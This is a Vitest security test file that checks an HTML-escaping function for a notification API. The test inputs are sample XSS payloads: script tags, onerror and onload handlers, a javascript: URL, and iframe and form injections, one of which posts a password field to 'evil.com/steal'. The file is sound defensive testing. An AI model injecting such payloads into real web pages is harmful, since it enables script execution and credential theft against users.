/**
 * XSS Prevention Security Tests
 * Tests for HTML escaping in notification APIs
 */

import { describe, it, expect } from 'vitest'

// Recreate the escapeHtml function from /api/notify/website-upsell for testing
function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;')
}

describe('XSS Prevention - HTML Escaping', () => {
  describe('Basic Escaping', () => {
    it('should escape ampersands', () => {
      expect(escapeHtml('Tom & Jerry')).toBe('Tom &amp; Jerry')
      expect(escapeHtml('a&b&c')).toBe('a&amp;b&amp;c')
    })

    it('should escape less-than signs', () => {
      expect(escapeHtml('a < b')).toBe('a &lt; b')
      expect(escapeHtml('1<2<3')).toBe('1&lt;2&lt;3')
    })

    it('should escape greater-than signs', () => {
      expect(escapeHtml('a > b')).toBe('a &gt; b')
      expect(escapeHtml('3>2>1')).toBe('3&gt;2&gt;1')
    })

    it('should escape double quotes', () => {
      expect(escapeHtml('say "hello"')).toBe('say &quot;hello&quot;')
      expect(escapeHtml('a"b"c')).toBe('a&quot;b&quot;c')
    })

    it('should escape single quotes', () => {
      expect(escapeHtml("it's fine")).toBe('it&#039;s fine')
      expect(escapeHtml("a'b'c")).toBe('a&#039;b&#039;c')
    })
  })

  describe('Script Injection Prevention', () => {
    it('should escape script tags', () => {
      const malicious = '<script>alert("XSS")</script>'
      const escaped = escapeHtml(malicious)
      expect(escaped).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;')
      expect(escaped).not.toContain('<script>')
      expect(escaped).not.toContain('</script>')
    })

    it('should escape inline JavaScript in event handlers', () => {
      const malicious = '<img src="x" onerror="alert(1)">'
      const escaped = escapeHtml(malicious)
      expect(escaped).toBe('&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;')
      expect(escaped).not.toContain('<img')
      // All HTML angle brackets are escaped, making it safe
      expect(escaped).not.toContain('<')
      expect(escaped).not.toContain('>')
    })

    it('should escape javascript: protocol URLs', () => {
      const malicious = '<a href="javascript:alert(1)">Click</a>'
      const escaped = escapeHtml(malicious)
      expect(escaped).toBe('&lt;a href=&quot;javascript:alert(1)&quot;&gt;Click&lt;/a&gt;')
    })

    it('should escape SVG with embedded script', () => {
      const malicious = '<svg onload="alert(1)"></svg>'
      const escaped = escapeHtml(malicious)
      expect(escaped).not.toContain('<svg')
      expect(escaped).toBe('&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;/svg&gt;')
    })
  })

  describe('HTML Injection Prevention', () => {
    it('should escape arbitrary HTML elements', () => {
      const malicious = '<div class="evil"><b>Bold</b></div>'
      const escaped = escapeHtml(malicious)
      expect(escaped).toBe('&lt;div class=&quot;evil&quot;&gt;&lt;b&gt;Bold&lt;/b&gt;&lt;/div&gt;')
    })

    it('should escape iframe injection', () => {
      const malicious = '<iframe src="https://evil.com"></iframe>'
      const escaped = escapeHtml(malicious)
      expect(escaped).not.toContain('<iframe')
    })

    it('should escape form injection', () => {
      const malicious = '<form action="https://evil.com/steal"><input name="password"></form>'
      const escaped = escapeHtml(malicious)
      expect(escaped).not.toContain('<form')
      expect(escaped).not.toContain('<input')
    })

    it('should escape style injection', () => {
      const malicious = '<style>body { display: none; }</style>'
      const escaped = escapeHtml(malicious)
      expect(escaped).not.toContain('<style>')
    })
  })

  describe('Business Input Escaping', () => {
    it('should safely escape business names with special characters', () => {
      expect(escapeHtml('AT&T')).toBe('AT&amp;T')
      expect(escapeHtml('Johnson & Johnson')).toBe('Johnson &amp; Johnson')
      expect(escapeHtml('M&M\'s')).toBe('M&amp;M&#039;s')
    })

    it('should safely escape industry names with quotes', () => {
      expect(escapeHtml('Technology & "Software"')).toBe('Technology &amp; &quot;Software&quot;')
    })

    it('should safely escape service areas with special characters', () => {
      expect(escapeHtml('New York, NY & Boston, MA')).toBe('New York, NY &amp; Boston, MA')
      expect(escapeHtml('San Francisco > Oakland')).toBe('San Francisco &gt; Oakland')
    })

    it('should handle legitimate business names that look suspicious', () => {
      // Business name that looks like HTML
      expect(escapeHtml('<ABC Corp>')).toBe('&lt;ABC Corp&gt;')
    })
  })

  describe('Combined Attack Patterns', () => {
    it('should handle nested malicious content', () => {
      const malicious = '<<script>alert("XSS")</script>>'
      const escaped = escapeHtml(malicious)
      expect(escaped).toBe('&lt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&gt;')
    })

    it('should handle double-encoded attacks', () => {
      // Already HTML encoded, escape the entities
      const malicious = '&lt;script&gt;alert(1)&lt;/script&gt;'
      const escaped = escapeHtml(malicious)
      expect(escaped).toBe('&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;')
    })

    it('should handle mixed content', () => {
      const malicious = 'Hello <b>World</b> & "Friends"'
      const escaped = escapeHtml(malicious)
      expect(escaped).toBe('Hello &lt;b&gt;World&lt;/b&gt; &amp; &quot;Friends&quot;')
    })
  })

  describe('Edge Cases', () => {
    it('should handle empty strings', () => {
      expect(escapeHtml('')).toBe('')
    })

    it('should handle strings with no special characters', () => {
      expect(escapeHtml('Hello World')).toBe('Hello World')
      expect(escapeHtml('abcdefg123')).toBe('abcdefg123')
    })

    it('should handle strings with only special characters', () => {
      expect(escapeHtml('<>&"\'')).toBe('&lt;&gt;&amp;&quot;&#039;')
    })

    it('should handle unicode content', () => {
      expect(escapeHtml('Hello 你好 مرحبا')).toBe('Hello 你好 مرحبا')
    })

    it('should handle emoji content', () => {
      expect(escapeHtml('Hello 👋 World 🌍')).toBe('Hello 👋 World 🌍')
    })

    it('should handle newlines and whitespace', () => {
      expect(escapeHtml('Line 1\nLine 2')).toBe('Line 1\nLine 2')
      expect(escapeHtml('Tab\there')).toBe('Tab\there')
    })

    it('should handle very long strings', () => {
      const longString = '<script>'.repeat(1000)
      const escaped = escapeHtml(longString)
      expect(escaped).not.toContain('<script>')
      // '<script>' (8 chars) becomes '&lt;script&gt;' (14 chars)
      expect(escaped.length).toBe(14 * 1000)
    })
  })
})
